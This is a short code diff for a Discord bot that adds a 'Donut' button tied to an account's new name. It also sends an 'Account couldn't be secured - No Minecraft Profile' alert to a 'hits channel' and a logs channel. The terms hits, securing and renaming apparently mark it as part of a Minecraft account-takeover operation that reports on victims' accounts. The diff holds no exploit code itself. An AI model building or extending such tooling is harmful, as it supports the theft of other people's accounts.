@@ -404,6 +404,15 @@ let obj = {
                             name: "unknown",
                             animated: false
                           }
+                        },
+                        {
+                          style: 1,
+                          type: 2,
+                          custom_id: `donut|${acc.newName}|1`,
+                          label: "Donut",
+                          emoji: {
+                            name: "🍩"
+                          }
                         }
                       ]
                     },
@@ -436,6 +445,15 @@ let obj = {
                 };             
                 await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
               } else {
+                // Send message to hits channel
+                let msgnomc = {
+                  embeds: [{
+                    description: "```\nAccount couldn't be secured - No Minecraft Profile.\n```",
+                    color: 0xFF0000
+                  }]
+                };             
+                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
+                
                 // Send embed to logs channel if configured
                 try {
                   const [logsChannelId, logsGuildId] = settings.logs_channel?.split("|") || [];
